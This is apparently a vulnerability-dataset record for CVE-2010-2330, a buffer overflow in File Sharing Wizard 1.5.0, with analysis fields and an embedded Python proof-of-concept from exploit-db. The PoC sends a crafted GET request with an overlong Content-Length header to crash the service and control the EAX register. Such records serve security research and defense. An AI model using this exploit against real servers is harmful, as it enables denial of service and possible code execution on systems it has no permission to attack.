      "cve_id": "CVE-2010-2330",
      "source": "exploit-db.com",
      "vulnerability": "Buffer Overflow",
      "description": "A buffer overflow vulnerability exists in File Sharing Wizard 1.5.0. The vulnerability can be triggered by sending a crafted HTTP GET request with an overly long 'Content-Length' header. The overflow allows for control of the EAX register.",
      "root_cause": "The application fails to properly handle the length of the 'Content-Length' header in an HTTP request, leading to a buffer overflow.",
      "weaknesses": [
        "Buffer Overflow",
        "Lack of proper input validation"
      ],
      "impact": "Denial of service. The overflow gives control of EAX, which can potentially lead to arbitrary code execution, although this is not explicitly stated in the exploit.",
      "attack_vector": "Remote. Sending a crafted HTTP GET request to the vulnerable server.",
      "attacker_capabilities": "The attacker must be able to send network requests to the vulnerable server.",
        "poc_code": "```python\nimport socket\nimport sys\n\nif len(sys.argv) < 2:\n    print \"Usage: vrfy.py <IP-Adr> <port>\"\n    sys.exit(1)\n\nips = sys.argv[1]\nport = int(sys.argv[2])\n\nstring = \"A\"*51\nstring += \"B\"*4 #controlling eax\nstring += \"C\"*500\n\nheader = \"Content-Length\"\n\nprint \"starting the attack for:\", ips\nprint \"\"\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ntry:\n    connect=s.connect((ips, port))\nexcept:\n    print \"no connection possible\"\n    sys.exit(1)\n\nprint \"\\r\\nsending payload\"\nprint \"...\"\npayload = (\n    'GET http://%s/ HTTP/1.0\\r\\n'\n    '%s: %s\\r\\n'\n    '\\r\\n') % (ips,header,string)\n\ns.send(payload)\ns.close()\n\nprint \"finished kicking device %s\" % (ips)\nprint \"... the service should be crashed ... check eax\"\n```"
